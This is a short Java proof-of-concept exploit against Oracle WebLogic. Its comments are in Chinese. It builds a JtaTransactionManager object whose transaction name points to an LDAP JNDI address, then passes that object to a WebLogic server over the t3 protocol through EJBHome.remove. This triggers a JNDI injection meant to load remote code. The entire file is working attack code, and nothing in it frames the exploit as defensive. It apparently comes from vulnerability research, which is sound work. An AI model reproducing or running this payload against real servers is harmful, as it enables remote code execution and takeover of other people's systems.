package com.longofo.weblogicrmi;

import com.bea.core.repackaged.springframework.transaction.jta.JtaTransactionManager;

import javax.ejb.EJBHome;
import javax.naming.Context;
import javax.naming.InitialContext;
import javax.naming.NamingException;
import java.util.Hashtable;

public class Payload1 {
    /**
     * 正常调用RMI的方式，使用JtaTransactionManager利用链恶意利用
     */
    public final static String JNDI_FACTORY = "weblogic.jndi.WLInitialContextFactory";

    public static InitialContext getInitialContext(String url) throws NamingException {
        Hashtable env = new Hashtable();
        env.put(Context.INITIAL_CONTEXT_FACTORY, JNDI_FACTORY);
        env.put(Context.PROVIDER_URL, url);
        return new InitialContext(env);
    }

    public static void main(String[] args) throws Exception {
        String jndiAddress = "ldap://127.0.0.1:1389/Object";


        //实例化JtaTransactionManager 对象，并且初始化UserTransactionName成员变量
        JtaTransactionManager jtaTransactionManager = new JtaTransactionManager();
        jtaTransactionManager.setUserTransactionName(jndiAddress);
        InitialContext initialContext = getInitialContext("t3://127.0.0.1:7001");

        EJBHome ejbHome = (EJBHome) initialContext.lookup("ejb/mgmt/MEJB");
        ejbHome.remove(jtaTransactionManager);
    }
}
